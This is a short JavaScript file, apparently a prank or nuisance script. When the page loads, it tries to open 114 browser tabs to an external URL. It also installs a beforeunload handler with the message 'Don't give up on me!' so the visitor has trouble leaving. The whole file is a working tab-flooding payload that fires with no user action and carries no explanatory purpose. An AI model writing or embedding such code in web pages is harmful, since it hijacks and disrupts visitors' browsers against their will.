function openMultipleTabs(url, times) {
  if (!url || isNaN(times) || times <= 0) {
    console.error("Invalid input: Provide a valid URL and a positive number of times.");
    return;
  }
  // Remove any previous popup warning
  const prevWarning = document.getElementById && document.getElementById("popup-warning");
  if (prevWarning) prevWarning.remove();

  let opened = 0;
  for (let i = 0; i < times; i++) {
    const win = window.open(url);
    if (win) opened++;
  }
  if (opened === 0) {
    showPopupBlockedWarning();
  }
}

function setupBeforeUnloadWarning(message = "Don't give up on me!") {
  window.addEventListener("beforeunload", (e) => {
    e.returnValue = message; // For compatibility with older browsers
    return message; // Modern browsers use this
  });
}

window.onload = () => {
  const videoUrl = "https://skidinghub.github.io/1294u01385/";
  const tabCount = 114;
  openMultipleTabs(videoUrl, tabCount);
};


